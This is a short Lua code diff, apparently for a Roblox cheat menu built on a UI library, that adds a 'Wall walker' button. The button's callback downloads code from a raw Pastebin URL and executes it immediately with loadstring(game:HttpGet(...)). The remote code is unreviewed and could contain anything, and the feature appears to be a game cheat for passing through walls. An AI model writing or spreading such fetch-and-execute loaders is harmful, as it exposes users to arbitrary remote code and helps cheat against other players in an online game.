@@ -35,3 +35,12 @@ local Tab = Window:CreateTab({
 })
 
 Tab:CreateSection("Section")
+
+local Button = Tab:CreateButton({
+	Name = "Wall walker",
+	Description = nil, -- Creates A Description For Users to know what the button does (looks bad if you use it all the time),
+    	Callback = function()
+	 loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
+         -- The function that takes place when the button is pressed
+    	end
+})
